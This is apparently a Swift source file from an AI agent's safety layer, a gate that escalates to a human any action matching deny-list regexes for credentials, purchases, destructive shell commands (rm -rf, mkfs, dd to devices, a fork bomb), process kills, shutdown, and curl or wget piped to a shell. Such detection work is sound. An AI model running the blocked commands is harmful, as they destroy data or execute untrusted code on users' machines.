import Foundation

public enum GateVerdict: Sendable, Equatable {
    case allow
    case deny(reason: String)
    /// Irreversible or denylisted: the loop must stop and ask a human.
    case needsHuman(reason: String)

    var label: String {
        switch self {
        case .allow: return "allow"
        case .deny(let r): return "deny(\(r))"
        case .needsHuman(let r): return "needsHuman(\(r))"
        }
    }
}

/// Classifies every action before it executes. Deny-list is hard: no policy
/// flag can override it — the step is escalated to a human instead.
public struct SafetyGate: Sendable {
    public var allowReversible: Bool
    public var allowIrreversible: Bool

    /// Patterns that always route to a human, even in `--allow-irreversible`
    /// runs: credentials, purchases, outbound messages.
    public static let denyPatterns: [(regex: String, why: String)] = [
        (#"(?i)\b(password|passwd|passcode|pin|otp|2fa|totp|cvc|cvv|security code|card number|kartu|sandi)\b"#,
         "credential-like content"),
        (#"(?i)\b(buy now|purchase|checkout|place order|konfirmasi pembayaran|bayar sekarang)\b"#,
         "possible purchase"),
        // Destructive shell variants — any rm flag bundle containing r or f
        // (-rf, -fr, -r -f, -vrf) routes to a human; plain rm -i stays free.
        (#"(?i)\brm\s+(-\w*\s+)*-\w*[rf]"#, "destructive shell"),
        (#"(?i)\b(mkfs|diskutil\s+erase)"#, "destructive shell"),
        // dd is dangerous only when it writes to a device — any flag order
        // (dd bs=4M if=x of=/dev/rdisk2). Writing an image to a file is a
        // normal irreversible step, not denylisted.
        (#"(?i)\bdd\b[^|;&]*\bof=\s*/dev/"#, "destructive shell"),
        // Disk/boot/service-bypass tools that can brick or persistently
        // alter the machine — humans only.
        (#"(?i)\b(csrutil|bless|fdisk|newfs_\w+|gpt\s+destroy)\b"#, "destructive shell"),
        (#"(?i)\blaunchctl\s+(bootout|disable|unload)\b"#, "destructive shell"),
        // The fork bomb is punctuation-only — a \b anchor can never match it.
        (#":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"#, "destructive shell"),
        // Process kill — "kill Finder" mid-task destroys the user's session.
        // kill <pid> (any signal or none — default SIGTERM kills too) as well
        // as pkill/killall/xkill; the word "kill" alone stays free.
        (#"(?i)\b(pkill|killall|xkill|kill\s+-\w+|kill\s+(-\w+\s+)*\d+)\b"#, "process kill"),
        // Power/session control — an agent must not log out or power off.
        (#"(?i)\b(shutdown|reboot|halt|poweroff)\b"#, "power/session control"),
        (#"(?i)\bpmset\s+(sleep|restart|shutdown)"#, "power/session control"),
        (#"(?i)osascript.*(shut\s*down|restart|log\s*out|sleep)"#, "power/session control"),
        // Remote code execution — `curl evil.sh | sh` is the classic
        // supply-chain footgun; a fetched script is never safe to run blind.
        (#"(?i)\b(curl|wget)\b[^|;&]*\|\s*(sudo\s+)?(ba|z)?sh\b"#, "remote script piped to shell"),
        (#"(?i)\b(curl|wget)\b[^|;&]*\|\s*(sudo\s+)?(python\d*|perl|ruby|osascript)\b"#, "remote script piped to interpreter"),
    ]

    public init(allowReversible: Bool = true, allowIrreversible: Bool = false) {
        self.allowReversible = allowReversible
        self.allowIrreversible = allowIrreversible
    }

    public func evaluate(_ action: Action) -> GateVerdict {
        // Deny-list first: it applies to every class.
        for payload in action.textPayloads {
            for rule in Self.denyPatterns {
                if payload.range(of: rule.regex, options: .regularExpression) != nil {
                    return .needsHuman(reason: "denylist: \(rule.why)")
                }
            }
        }
        switch action.actionClass {
        case .read:
            return .allow
        case .reversible:
            return allowReversible ? .allow : .deny(reason: "reversible actions disabled")
        case .irreversible:
            return allowIrreversible
                ? .needsHuman(reason: "irreversible requires human confirmation")
                : .deny(reason: "irreversible not allowed (pass --allow-irreversible to queue for confirmation)")
        }
    }
}
